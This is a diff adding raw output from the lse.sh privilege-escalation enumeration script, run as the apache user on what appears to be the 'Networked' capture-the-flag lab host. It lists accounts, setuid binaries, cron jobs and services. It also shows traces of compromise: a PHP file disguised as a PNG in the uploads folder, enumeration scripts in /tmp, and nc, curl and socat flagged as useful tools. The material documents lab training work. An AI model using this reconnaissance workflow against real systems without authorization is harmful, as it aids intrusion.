@@ -1,0 +1,1308 @@
+apache@networked /tmp $ ./lse.sh -l2
+---
+If you know the current user password, write it here to check sudo privileges: 
+---
+
+ LSE Version: 1.17
+
+        User: apache
+     User ID: 48
+    Password: none
+        Home: /usr/share/httpd
+        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+       umask: 0022
+
+    Hostname: networked.htb
+       Linux: 3.10.0-957.21.3.el7.x86_64
+Distribution: CentOS Linux 7 (Core)
+Architecture: x86_64
+
+==================================================================( users )=====
+[i] usr000 Current user groups............................................. yes!
+---
+apache
+---
+[*] usr010 Is current user in an administrative group?..................... nope
+[*] usr020 Are there other users in an administrative groups?.............. nope
+[*] usr030 Other users with shell.......................................... yes!
+---
+root:x:0:0:root:/root:/bin/bash
+guly:x:1000:1000:guly:/home/guly:/bin/bash
+---
+[i] usr040 Environment information......................................... yes!
+---
+TERM=xterm
+SHELL=bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/usr/sbin
+PWD=/tmp
+LANG=C
+NOTIFY_SOCKET=/run/systemd/notify
+SHLVL=5
+LS_OPTIONS=--color=auto
+_=/usr/bin/env
+---
+[i] usr050 Groups for other users.......................................... yes!
+---
+root:x:0:
+bin:x:1:
+daemon:x:2:
+sys:x:3:
+adm:x:4:
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mem:x:8:
+kmem:x:9:
+wheel:x:10:
+cdrom:x:11:
+mail:x:12:postfix
+man:x:15:
+dialout:x:18:
+floppy:x:19:
+games:x:20:
+tape:x:33:
+video:x:39:
+ftp:x:50:
+lock:x:54:
+audio:x:63:
+nobody:x:99:
+users:x:100:
+utmp:x:22:
+utempter:x:35:
+input:x:999:
+systemd-journal:x:190:
+systemd-network:x:192:
+dbus:x:81:
+polkitd:x:998:
+ssh_keys:x:997:
+sshd:x:74:
+postdrop:x:90:
+postfix:x:89:
+guly:x:1000:guly
+saslauth:x:76:
+apache:x:48:
+mailnull:x:47:
+smmsp:x:51:
+tcpdump:x:72:
+---
+[i] usr060 Other users..................................................... yes!
+---
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+guly:x:1000:1000:guly:/home/guly:/bin/bash
+saslauth:x:998:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+---
+[*] usr070 PATH variables defined inside /etc.............................. yes!
+---
+/bin
+/sbin
+/usr/bin
+/usr/bin
+/usr/sbin
+---
+[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
+===================================================================( sudo )=====
+[!] sud000 Can we sudo without a password?................................. nope
+[!] sud010 Can we list sudo commands without a password?................... nope
+[*] sud040 Can we read /etc/sudoers?....................................... nope
+[*] sud050 Do we know if any other users used sudo?........................ nope
+============================================================( file system )=====
+[*] fst000 Writable files outside user's home.............................. yes!
+---
+/var/tmp
+/var/lib/php/session
+/var/lib/dav
+/var/cache/httpd
+/var/cache/httpd/proxy
+/var/www/html/uploads
+/var/www/html/uploads/10_10_14_44.php.png
+/tmp
+/tmp/lse.sh
+/tmp/linpeas.sh
+---
+[*] fst010 Binaries with setuid bit........................................ yes!
+---
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/crontab
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+---
+[!] fst020 Uncommon setuid binaries........................................ nope
+[!] fst030 Can we write to any setuid binary?.............................. nope
+[*] fst040 Binaries with setgid bit........................................ skip
+[!] fst050 Uncommon setgid binaries........................................ skip
+[!] fst060 Can we write to any setgid binary?.............................. skip
+[*] fst070 Can we read /root?.............................................. nope
+[*] fst080 Can we read subdirectories under /home?......................... yes!
+---
+total 28
+drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
+drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
+lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
+-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
+-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
+-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
+-rw-------  1 guly guly 639 Jul  9  2019 .viminfo
+-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
+-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
+-r--------. 1 guly guly  33 Oct 30  2018 user.txt
+---
+[*] fst090 SSH files in home directories................................... nope
+[*] fst100 Useful binaries................................................. yes!
+---
+/usr/bin/curl
+/usr/bin/nc
+/usr/bin/socat
+---
+[*] fst110 Other interesting files in home directories..................... nope
+[!] fst120 Are there any credentials in fstab/mtab?........................ nope
+[*] fst130 Does 'apache' have mail?........................................ nope
+[!] fst140 Can we access other users mail?................................. nope
+[*] fst150 Looking for GIT/SVN repositories................................ nope
+[!] fst160 Can we write to critical files?................................. nope
+[!] fst170 Can we write to critical directories?........................... nope
+[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
+[i] fst500 Files owned by user 'apache'.................................... yes!
+---
+-rw-r--r-- 1 apache apache 77 Aug  9 15:01 /var/www/html/uploads/10_10_14_44.php.png
+-rwxr-xr-x 1 apache apache 34374 Aug  9 15:07 /tmp/lse.sh
+-rwxr-xr-x 1 apache apache 159864 Aug  9 15:07 /tmp/linpeas.sh
+---
+[i] fst510 SSH files anywhere.............................................. nope
+[i] fst520 Check hosts.equiv file and its contents......................... nope
+[i] fst530 List NFS server shares.......................................... yes!
+---
+-rw-r--r--. 1 root root 0 Jun  7  2013 /etc/exports
+---
+[i] fst540 Dump fstab file................................................. yes!
+---
+
+#
+# /etc/fstab
+# Created by anaconda on Tue Jul  2 13:21:32 2019
+#
+# Accessible filesystems, by reference, are maintained under '/dev/disk'
+# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
+#
+/dev/mapper/centos-root /                       xfs     defaults        0 0
+UUID=1b610dfb-776c-4976-b3f3-df896ee84569 /boot                   xfs     defaults        0 0
+/dev/mapper/centos-swap swap                    swap    defaults        0 0
+---
+=================================================================( system )=====
+[i] sys000 Who is logged in................................................ yes!
+---
+ 15:09:35 up 20 min,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+---
+[i] sys010 Last logged in users............................................ yes!
+---
+reboot   system boot  3.10.0-957.21.3. Sun Aug  9 14:48 - 15:09  (00:20)    
+root     tty1                          Mon Jul 15 11:32 - 11:35  (00:02)    
+reboot   system boot  3.10.0-957.21.3. Mon Jul 15 11:31 - 15:09 (391+03:37) 
+
+wtmp begins Tue Jul  9 13:42:03 2019
+---
+[!] sys020 Does the /etc/passwd have hashes?............................... nope
+[!] sys030 Can we read /etc/shadow file?................................... nope
+[!] sys030 Can we read /etc/shadow- file?.................................. nope
+[!] sys030 Can we read /etc/shadow~ file?.................................. nope
+[!] sys030 Can we read /etc/master.passwd file?............................ nope
+[*] sys040 Check for other superuser accounts.............................. nope
+[*] sys050 Can root user log in via SSH?................................... nope
+[i] sys060 List available shells........................................... yes!
+---
+/bin/sh
+/bin/bash
+/usr/bin/sh
+/usr/bin/bash
+---
+[i] sys070 System umask in /etc/login.defs................................. yes!
+---
+UMASK           077
+---
+[i] sys080 System password policies in /etc/login.defs..................... yes!
+---
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512 
+---
+===============================================================( security )=====
+[*] sec000 Is SELinux present?............................................. yes!
+---
+SELinux status:                 disabled
+---
+[*] sec010 List files with capabilities.................................... yes!
+---
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+---
+[!] sec020 Can we write to a binary with caps?............................. nope
+[!] sec030 Do we have all caps in any binary?.............................. nope
+[*] sec040 Users with associated capabilities.............................. nope
+[!] sec050 Does current user have capabilities?............................ skip
+========================================================( recurrent tasks )=====
+[*] ret000 User crontab.................................................... nope
+[!] ret010 Cron tasks writable by user..................................... nope
+[*] ret020 Cron jobs....................................................... yes!
+---
+/etc/crontab:SHELL=/bin/bash
+/etc/crontab:PATH=/sbin:/bin:/usr/sbin:/usr/bin
+/etc/crontab:MAILTO=root
+/etc/cron.d/0hourly:SHELL=/bin/bash
+/etc/cron.d/0hourly:PATH=/sbin:/bin:/usr/sbin:/usr/bin
+/etc/cron.d/0hourly:MAILTO=root
+/etc/cron.d/0hourly:01 * * * * root run-parts /etc/cron.hourly
+---
+[*] ret030 Can we read user crontabs....................................... nope
+[*] ret040 Can we list other user cron tasks?.............................. nope
+[*] ret050 Can we write to any paths present in cron jobs.................. yes!
+---
+/dev/null
+---
+[!] ret060 Can we write to executable paths present in cron jobs........... nope
+[i] ret400 Cron files...................................................... yes!
+---
+-rw-------. 1 root root   0 Nov 20  2018 /etc/cron.deny
+-rw-r--r--. 1 root root 451 Jun 10  2014 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x.  2 root root   21 Jul  2  2019 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+-rw-r--r--.  1 root root  128 Nov 20  2018 0hourly
+
+/etc/cron.daily:
+total 20
+drwxr-xr-x.  2 root root   42 Jul  2  2019 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+-rwx------.  1 root root  219 Oct 30  2018 logrotate
+-rwxr-xr-x.  1 root root  618 Oct 30  2018 man-db.cron
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.  2 root root   22 Jul  2  2019 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+-rwxr-xr-x.  1 root root  392 Nov 20  2018 0anacron
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun 10  2014 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x.  2 root root    6 Jun 10  2014 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+---
+[*] ret500 User systemd timers............................................. nope
+[!] ret510 Can we write in any system timer?............................... nope
+[i] ret900 Systemd timers.................................................. yes!
+---
+NEXT                          LEFT     LAST                          PASSED   UNIT                         ACTIVATES
+Mon 2020-08-10 15:03:57 CEST  23h left Sun 2020-08-09 15:03:57 CEST  5min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                           n/a      n/a                           n/a      systemd-readahead-done.timer systemd-readahead-done.service
+
+2 timers listed.
+---
+================================================================( network )=====
+[*] net000 Services listening only on localhost............................ yes!
+---
+tcp    LISTEN     0      10     127.0.0.1:25                    *:*                  
+---
+[!] net010 Can we sniff traffic with tcpdump?.............................. nope
+[i] net500 NIC and IP information.......................................... yes!
+---
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
+    link/ether 00:50:56:b9:72:ba brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.146/24 brd 10.10.10.255 scope global ens33
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:72ba/64 scope global mngtmpaddr dynamic 
+       valid_lft 86214sec preferred_lft 14214sec
+    inet6 fe80::250:56ff:feb9:72ba/64 scope link 
+       valid_lft forever preferred_lft forever
+---
+[i] net510 Routing table................................................... yes!
+---
+default via 10.10.10.2 dev ens33 
+10.10.10.0/24 dev ens33 proto kernel scope link src 10.10.10.146 
+169.254.0.0/16 dev ens33 scope link metric 1002 
+---
+[i] net520 ARP table....................................................... yes!
+---
+10.10.10.2 dev ens33 lladdr 00:50:56:b9:75:a0 REACHABLE
+fe80::250:56ff:feb9:75a0 dev ens33 lladdr 00:50:56:b9:75:a0 router STALE
+---
+[i] net530 Namerservers.................................................... nope
+[i] net540 Systemd Nameservers............................................. nope
+[i] net550 Listening TCP................................................... yes!
+---
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
+LISTEN     0      128          *:22                       *:*                  
+LISTEN     0      10     127.0.0.1:25                       *:*                  
+LISTEN     0      128         :::80                      :::*                  
+LISTEN     0      128         :::22                      :::*                  
+---
+[i] net560 Listening UDP................................................... yes!
+---
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
+---
+===============================================================( services )=====
+[!] srv000 Can we write in service files?.................................. nope
+[!] srv010 Can we write in binaries executed by services?.................. nope
+[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
+[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
+[*] srv040 Upstart files not belonging to root............................. nope
+[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
+[i] srv400 Contents of /etc/inetd.conf..................................... nope
+[i] srv410 Contents of /etc/xinetd.conf.................................... nope
+[i] srv420 List /etc/xinetd.d if used...................................... yes!
+---
+total 12
+drwxr-xr-x.  2 root root    6 Apr 11  2018 .
+drwxr-xr-x. 79 root root 8192 Jul  9  2019 ..
+---
+[i] srv430 List /etc/init.d/ permissions................................... yes!
+---
+lrwxrwxrwx. 1 root root 11 Jul  2  2019 /etc/init.d -> rc.d/init.d
+---
+[i] srv440 List /etc/rc.d/init.d permissions............................... yes!
+---
+total 40
+drwxr-xr-x.  2 root root    70 Jul  8  2019 .
+drwxr-xr-x. 10 root root   127 Jul  8  2019 ..
+-rw-r--r--   1 root root  1160 Jul  3  2019 README
+-rw-r--r--.  1 root root 18281 Aug 24  2018 functions
+-rwxr-xr-x.  1 root root  4569 Aug 24  2018 netconsole
+-rwxr-xr-x.  1 root root  7923 Aug 24  2018 network
+---
+[i] srv450 List /usr/local/etc/rc.d permissions............................ nope
+[i] srv460 List /etc/init/ permissions..................................... nope
+[!] srv500 Can we write in systemd service files?.......................... nope
+[!] srv510 Can we write in binaries executed by systemd services?.......... nope
+[*] srv520 Systemd files not belonging to root............................. nope
+[i] srv900 Systemd config files permissions................................ yes!
+---
+/lib/systemd/:
+total 7.8M
+drwxr-xr-x. 25 root root  12K Jul  8  2019 system
+drwxr-xr-x.  2 root root 4.0K Jul  8  2019 system-generators
+drwxr-xr-x.  2 root root  271 Jul  8  2019 user
+drwxr-xr-x.  2 root root  122 Jul  8  2019 system-preset
+drwxr-xr-x.  2 root root  162 Jul  8  2019 catalog
+-rwxr-xr-x   1 root root 1.6M Jul  3  2019 systemd
+-rwxr-xr-x   1 root root  24K Jul  3  2019 systemd-ac-power
+-rwxr-xr-x   1 root root  69K Jul  3  2019 systemd-activate
+-rwxr-xr-x   1 root root  74K Jul  3  2019 systemd-backlight
+-rwxr-xr-x   1 root root  65K Jul  3  2019 systemd-binfmt
+-rwxr-xr-x   1 root root 130K Jul  3  2019 systemd-bootchart
+-rwxr-xr-x   1 root root  36K Jul  3  2019 systemd-cgroups-agent
+-rwxr-xr-x   1 root root 130K Jul  3  2019 systemd-coredump
+-rwxr-xr-x   1 root root 102K Jul  3  2019 systemd-cryptsetup
+-rwxr-xr-x   1 root root 332K Jul  3  2019 systemd-fsck
+-rwxr-xr-x   1 root root  41K Jul  3  2019 systemd-hibernate-resume
+-rwxr-xr-x   1 root root 368K Jul  3  2019 systemd-hostnamed
+-rwxr-xr-x   1 root root 368K Jul  3  2019 systemd-importd
+-rwxr-xr-x   1 root root 311K Jul  3  2019 systemd-initctl
+-rwxr-xr-x   1 root root 339K Jul  3  2019 systemd-journald
+-rwxr-xr-x   1 root root 376K Jul  3  2019 systemd-localed
+-rwxr-xr-x   1 root root 621K Jul  3  2019 systemd-logind
+-rwxr-xr-x   1 root root  53K Jul  3  2019 systemd-machine-id-commit
+-rwxr-xr-x   1 root root 483K Jul  3  2019 systemd-machined
+-rwxr-xr-x   1 root root  65K Jul  3  2019 systemd-modules-load
+-rwxr-xr-x   1 root root 184K Jul  3  2019 systemd-pull
+-rwxr-xr-x   1 root root  45K Jul  3  2019 systemd-quotacheck
+-rwxr-xr-x   1 root root  49K Jul  3  2019 systemd-random-seed
+-rwxr-xr-x   1 root root  98K Jul  3  2019 systemd-readahead
+-rwxr-xr-x   1 root root  61K Jul  3  2019 systemd-remount-fs
+-rwxr-xr-x   1 root root  37K Jul  3  2019 systemd-reply-password
+-rwxr-xr-x   1 root root  61K Jul  3  2019 systemd-rfkill
+-rwxr-xr-x   1 root root 147K Jul  3  2019 systemd-shutdown
+-rwxr-xr-x   1 root root  65K Jul  3  2019 systemd-shutdownd
+-rwxr-xr-x   1 root root  90K Jul  3  2019 systemd-sleep
+-rwxr-xr-x   1 root root 106K Jul  3  2019 systemd-socket-proxyd
+-rwxr-xr-x   1 root root  69K Jul  3  2019 systemd-sysctl
+-rwxr-xr-x   1 root root 377K Jul  3  2019 systemd-timedated
+-rwxr-xr-x   1 root root 407K Jul  3  2019 systemd-udevd
+-rwxr-xr-x   1 root root  45K Jul  3  2019 systemd-update-done
+-rwxr-xr-x   1 root root 310K Jul  3  2019 systemd-update-utmp
+-rwxr-xr-x   1 root root  45K Jul  3  2019 systemd-user-sessions
+-rwxr-xr-x   1 root root  53K Jul  3  2019 systemd-vconsole-setup
+drwxr-xr-x.  2 root root    6 Jul  3  2019 user-preset
+drwxr-xr-x.  2 root root    6 Jul  3  2019 ntp-units.d
+drwxr-xr-x.  2 root root    6 Jul  3  2019 system-shutdown
+drwxr-xr-x.  2 root root    6 Jul  3  2019 system-sleep
+drwxr-xr-x.  2 root root    6 Jul  3  2019 user-generators
+-rw-r--r--   1 root root 9.4K Jul  3  2019 import-pubring.gpg
+lrwxrwxrwx.  1 root root   24 Jul  2  2019 systemd-sysv-install -> ../../..//sbin/chkconfig
+-rwxr-xr-x.  1 root root 2.4K Aug 24  2018 rhel-autorelabel
+-rwxr-xr-x.  1 root root  399 Aug 24  2018 rhel-configure
+-rwxr-xr-x.  1 root root  110 Aug 24  2018 rhel-dmesg
+-rwxr-xr-x.  1 root root  158 Aug 24  2018 rhel-domainname
+-rwxr-xr-x.  1 root root 1.1K Aug 24  2018 rhel-import-state
+-rwxr-xr-x.  1 root root  233 Aug 24  2018 rhel-loadmodules
+-rwxr-xr-x.  1 root root 5.8K Aug 24  2018 rhel-readonly
+
+/lib/systemd/system:
+total 828K
+drwxr-xr-x. 2 root root   42 Jul  8  2019 timers.target.wants
+drwxr-xr-x. 2 root root 4.0K Jul  8  2019 sysinit.target.wants
+drwxr-xr-x. 2 root root  189 Jul  8  2019 sockets.target.wants
+drwxr-xr-x. 2 root root   50 Jul  8  2019 runlevel5.target.wants
+lrwxrwxrwx  1 root root   13 Jul  8  2019 runlevel6.target -> reboot.target
+drwxr-xr-x. 2 root root   50 Jul  8  2019 runlevel4.target.wants
+lrwxrwxrwx  1 root root   16 Jul  8  2019 runlevel5.target -> graphical.target
+drwxr-xr-x. 2 root root   50 Jul  8  2019 runlevel2.target.wants
+lrwxrwxrwx  1 root root   17 Jul  8  2019 runlevel3.target -> multi-user.target
+drwxr-xr-x. 2 root root   50 Jul  8  2019 runlevel3.target.wants
+lrwxrwxrwx  1 root root   17 Jul  8  2019 runlevel4.target -> multi-user.target
+drwxr-xr-x. 2 root root   50 Jul  8  2019 runlevel1.target.wants
+lrwxrwxrwx  1 root root   17 Jul  8  2019 runlevel2.target -> multi-user.target
+drwxr-xr-x. 2 root root   50 Jul  8  2019 rescue.target.wants
+lrwxrwxrwx  1 root root   15 Jul  8  2019 runlevel0.target -> poweroff.target
+lrwxrwxrwx  1 root root   13 Jul  8  2019 runlevel1.target -> rescue.target
+drwxr-xr-x. 2 root root   81 Jul  8  2019 reboot.target.wants
+drwxr-xr-x. 2 root root   83 Jul  8  2019 poweroff.target.wants
+drwxr-xr-x. 2 root root  258 Jul  8  2019 multi-user.target.wants
+drwxr-xr-x. 2 root root   40 Jul  8  2019 local-fs.target.wants
+drwxr-xr-x. 2 root root   50 Jul  8  2019 graphical.target.wants
+lrwxrwxrwx  1 root root   16 Jul  8  2019 default.target -> graphical.target
+lrwxrwxrwx  1 root root   25 Jul  8  2019 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
+lrwxrwxrwx  1 root root   24 Jul  8  2019 dbus-org.freedesktop.machine1.service -> systemd-machined.service
+lrwxrwxrwx  1 root root   23 Jul  8  2019 dbus-org.freedesktop.locale1.service -> systemd-localed.service
+lrwxrwxrwx  1 root root   22 Jul  8  2019 dbus-org.freedesktop.login1.service -> systemd-logind.service
+lrwxrwxrwx  1 root root   13 Jul  8  2019 ctrl-alt-del.target -> reboot.target
+lrwxrwxrwx  1 root root   25 Jul  8  2019 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
+lrwxrwxrwx  1 root root   23 Jul  8  2019 dbus-org.freedesktop.import1.service -> systemd-importd.service
+lrwxrwxrwx  1 root root   14 Jul  8  2019 autovt@.service -> getty@.service
+drwxr-xr-x. 2 root root   67 Jul  3  2019 basic.target.wants
+drwxr-xr-x. 2 root root    6 Jul  3  2019 dbus.target.wants
+drwxr-xr-x. 2 root root    6 Jul  3  2019 default.target.wants
+drwxr-xr-x. 2 root root    6 Jul  3  2019 syslog.target.wants
+-rw-r--r--  1 root root  403 Jul  3  2019 -.slice
+-rw-r--r--  1 root root  517 Jul  3  2019 basic.target
+-rw-r--r--  1 root root  379 Jul  3  2019 bluetooth.target
+-rw-r--r--  1 root root  787 Jul  3  2019 console-getty.service
+-rw-r--r--  1 root root  749 Jul  3  2019 console-shell.service
+-rw-r--r--  1 root root  808 Jul  3  2019 container-getty@.service
+-rw-r--r--  1 root root  425 Jul  3  2019 cryptsetup-pre.target
+-rw-r--r--  1 root root  372 Jul  3  2019 cryptsetup.target
+-rw-r--r--  1 root root 1014 Jul  3  2019 debug-shell.service
+-rw-r--r--  1 root root  670 Jul  3  2019 dev-hugepages.mount
+-rw-r--r--  1 root root  590 Jul  3  2019 dev-mqueue.mount
+-rw-r--r--  1 root root  976 Jul  3  2019 emergency.service
+-rw-r--r--  1 root root  431 Jul  3  2019 emergency.target
+-rw-r--r--  1 root root  440 Jul  3  2019 final.target
+-rw-r--r--  1 root root  466 Jul  3  2019 getty-pre.target
+-rw-r--r--  1 root root  460 Jul  3  2019 getty.target
+-rw-r--r--  1 root root 1.6K Jul  3  2019 getty@.service
+-rw-r--r--  1 root root  558 Jul  3  2019 graphical.target
+-rw-r--r--  1 root root  565 Jul  3  2019 halt-local.service
+-rw-r--r--  1 root root  487 Jul  3  2019 halt.target
+-rw-r--r--  1 root root  447 Jul  3  2019 hibernate.target
+-rw-r--r--  1 root root  468 Jul  3  2019 hybrid-sleep.target
+-rw-r--r--  1 root root  634 Jul  3  2019 initrd-cleanup.service
+-rw-r--r--  1 root root  553 Jul  3  2019 initrd-fs.target
+-rw-r--r--  1 root root  802 Jul  3  2019 initrd-parse-etc.service
+-rw-r--r--  1 root root  526 Jul  3  2019 initrd-root-fs.target
+-rw-r--r--  1 root root  644 Jul  3  2019 initrd-switch-root.service
+-rw-r--r--  1 root root  691 Jul  3  2019 initrd-switch-root.target
+-rw-r--r--  1 root root  668 Jul  3  2019 initrd-udevadm-cleanup-db.service
+-rw-r--r--  1 root root  671 Jul  3  2019 initrd.target
+-rw-r--r--  1 root root  501 Jul  3  2019 kexec.target
+-rw-r--r--  1 root root  679 Jul  3  2019 kmod-static-nodes.service
+-rw-r--r--  1 root root  395 Jul  3  2019 local-fs-pre.target
+-rw-r--r--  1 root root  507 Jul  3  2019 local-fs.target
+-rw-r--r--  1 root root  405 Jul  3  2019 machine.slice
+-rw-r--r--  1 root root  531 Jul  3  2019 machines.target
+-rw-r--r--  1 root root  492 Jul  3  2019 multi-user.target
+-rw-r--r--  1 root root  464 Jul  3  2019 network-online.target
+-rw-r--r--  1 root root  461 Jul  3  2019 network-pre.target
+-rw-r--r--  1 root root  480 Jul  3  2019 network.target
+-rw-r--r--  1 root root  514 Jul  3  2019 nss-lookup.target
+-rw-r--r--  1 root root  473 Jul  3  2019 nss-user-lookup.target
+-rw-r--r--  1 root root  354 Jul  3  2019 paths.target
+-rw-r--r--  1 root root  552 Jul  3  2019 poweroff.target
+-rw-r--r--  1 root root  377 Jul  3  2019 printer.target
+-rw-r--r--  1 root root  705 Jul  3  2019 proc-sys-fs-binfmt_misc.automount
+-rw-r--r--  1 root root  615 Jul  3  2019 proc-sys-fs-binfmt_misc.mount
+-rw-r--r--  1 root root  643 Jul  3  2019 quotaon.service
+-rw-r--r--  1 root root  632 Jul  3  2019 rc-local.service
+-rw-r--r--  1 root root  543 Jul  3  2019 reboot.target
+-rw-r--r--  1 root root  509 Jul  3  2019 remote-cryptsetup.target
+-rw-r--r--  1 root root  396 Jul  3  2019 remote-fs-pre.target
+-rw-r--r--  1 root root  482 Jul  3  2019 remote-fs.target
+-rw-r--r--  1 root root  979 Jul  3  2019 rescue.service
+-rw-r--r--  1 root root  486 Jul  3  2019 rescue.target
+-rw-r--r--  1 root root  500 Jul  3  2019 rpcbind.target
+-rw-r--r--  1 root root 1.1K Jul  3  2019 serial-getty@.service
+-rw-r--r--  1 root root  402 Jul  3  2019 shutdown.target
+-rw-r--r--  1 root root  362 Jul  3  2019 sigpwr.target
+-rw-r--r--  1 root root  420 Jul  3  2019 sleep.target
+-rw-r--r--  1 root root  409 Jul  3  2019 slices.target
+-rw-r--r--  1 root root  380 Jul  3  2019 smartcard.target
+-rw-r--r--  1 root root  356 Jul  3  2019 sockets.target
+-rw-r--r--  1 root root  380 Jul  3  2019 sound.target
+-rw-r--r--  1 root root  441 Jul  3  2019 suspend.target
+-rw-r--r--  1 root root  353 Jul  3  2019 swap.target
+-rw-r--r--  1 root root  681 Jul  3  2019 sys-fs-fuse-connections.mount
+-rw-r--r--  1 root root  719 Jul  3  2019 sys-kernel-config.mount
+-rw-r--r--  1 root root  662 Jul  3  2019 sys-kernel-debug.mount
+-rw-r--r--  1 root root  518 Jul  3  2019 sysinit.target
+-rw-r--r--  1 root root 1.3K Jul  3  2019 syslog.socket
+-rw-r--r--  1 root root  652 Jul  3  2019 system-update.target
+-rw-r--r--  1 root root  433 Jul  3  2019 system.slice
+-rw-r--r--  1 root root  646 Jul  3  2019 systemd-ask-password-console.path
+-rw-r--r--  1 root root  657 Jul  3  2019 systemd-ask-password-console.service
+-rw-r--r--  1 root root  574 Jul  3  2019 systemd-ask-password-wall.path
+-rw-r--r--  1 root root  689 Jul  3  2019 systemd-ask-password-wall.service
+-rw-r--r--  1 root root  799 Jul  3  2019 systemd-backlight@.service
+-rw-r--r--  1 root root 1.1K Jul  3  2019 systemd-binfmt.service
+-rw-r--r--  1 root root  654 Jul  3  2019 systemd-bootchart.service
+-rw-r--r--  1 root root  826 Jul  3  2019 systemd-firstboot.service
+-rw-r--r--  1 root root  682 Jul  3  2019 systemd-fsck-root.service
+-rw-r--r--  1 root root  702 Jul  3  2019 systemd-fsck@.service
+-rw-r--r--  1 root root  548 Jul  3  2019 systemd-halt.service
+-rw-r--r--  1 root root  635 Jul  3  2019 systemd-hibernate-resume@.service
+-rw-r--r--  1 root root  505 Jul  3  2019 systemd-hibernate.service
+-rw-r--r--  1 root root  714 Jul  3  2019 systemd-hostnamed.service
+-rw-r--r--  1 root root  838 Jul  3  2019 systemd-hwdb-update.service
+-rw-r--r--  1 root root  523 Jul  3  2019 systemd-hybrid-sleep.service
+-rw-r--r--  1 root root  693 Jul  3  2019 systemd-importd.service
+-rw-r--r--  1 root root  484 Jul  3  2019 systemd-initctl.service
+-rw-r--r--  1 root root  524 Jul  3  2019 systemd-initctl.socket
+-rw-r--r--  1 root root  738 Jul  3  2019 systemd-journal-catalog-update.service
+-rw-r--r--  1 root root  735 Jul  3  2019 systemd-journal-flush.service
+-rw-r--r--  1 root root 1.2K Jul  3  2019 systemd-journald.service
+-rw-r--r--  1 root root  833 Jul  3  2019 systemd-journald.socket
+-rw-r--r--  1 root root  561 Jul  3  2019 systemd-kexec.service
